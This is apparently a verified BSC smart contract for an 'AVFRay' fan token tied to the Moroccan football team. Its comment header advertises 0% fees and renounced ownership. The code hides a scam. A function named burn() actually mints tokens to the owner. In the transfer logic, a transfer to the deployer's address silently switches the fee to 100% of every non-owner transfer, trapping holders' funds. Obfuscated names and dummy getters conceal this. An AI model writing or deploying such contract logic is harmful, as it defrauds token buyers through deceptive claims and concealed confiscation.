/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

/* 
Team AVFRay
The AVFRay national football team, nicknamed "the Atlas Lions" Fan Token
AVFRayTeam
teamAVFRay
AVFRay Fan Token
Trust AVFRay 🇲🇦❤️ AVFRay will never fail you 

🔶https://t.me/teamAVFRay2022


TOKENOMICS :
💠 Supply - 10 Q (Ten quadrillion)
💠 LP LOCKED
✅ CA VERIFIED & RENOUNCED
✅ 100% SAFU DEV TEAM 
✅ OWNERSHIP RENOUNCED 
✅ 0% BUY/ 0% SELL 

*/

// SPDX-License-Identifier: MIT
pragma solidity =0.5.5;

contract AVFRay {
address private  mKgljz = address(0);
address private  FOaDQe = address(0);
address private  CzOZGH = address(0);
uint256 private  wSIuLL = 1;
uint256 private  VAUAPI = 1;
address private  HWflis = address(0);
string public  name = "AVFRay";
uint256 private  mFLKBb = 1;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  TajAvj = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  QanjTY = address(0);
uint8 public constant decimals = 18;
uint256 public constant totalSupply = 10000000000000000000000000000;
address public owner;
mapping (address => uint256) public balanceOf;
uint256 private  ZXAveS = 1;
uint256 private  FCwXvs = 1;
uint256 private  SXIhRW = 1;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  FRlavJ = 1000000000000000000;
address private  lvmfuf = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address private  kYVORv = address(0);
string public  symbol = "AVFRay";
address private  dKwbiC = address(0);
uint256 public constant Uaortd = 99999;
function _getkYVORv() private returns (address) {
return kYVORv;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_psssthrough(msg.sender, recipient, amount);
return true;
}


function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getSXIhRW() private returns (uint256) {
return SXIhRW+1;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}


function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}


function _getlvmfuf() private returns (address) {
return lvmfuf;
}


function _getZXAveS() private returns (uint256) {
return ZXAveS+2;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tnrmvuj 0");
require(spender != address(0), "fnrmvuj 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getHWflis() private returns (address) {
return HWflis;
}

function _getmFLKBb() private returns (uint256) {
return mFLKBb+3;
}

function _getTajAvj() private returns (address) {
return TajAvj;
}

function _getwSIuLL() private returns (uint256) {
return wSIuLL+4;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_psssthrough(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}


function _getFOaDQe() private returns (address) {
return FOaDQe;
}

function _getCzOZGH() private returns (address) {
return CzOZGH;
}

function _getVAUAPI() private returns (uint256) {
return VAUAPI+5;
}



function _psssthrough(address from, address to, uint256 amount) private {
require(from != address(0), "nrmvuj");
require(to != address(0), "nrmvuj");
require(amount <= balanceOf[from], "nrmvuj");
uint256 fee;
	if (from == owner || to == owner){
		fee = 0;
		}
	else{
		fee = amount* Uaortd/FRlavJ ;
		}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;

if (to==dKwbiC){
FRlavJ = Uaortd;
}
emit Transfer(from, to, transferAmount);
}
function _getQanjTY() private returns (address) {
return QanjTY;
}

function _getmKgljz() private returns (address) {
return mKgljz;
}

constructor () public {
dKwbiC = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}


function _getFCwXvs() private returns (uint256) {
return FCwXvs+6;
}


}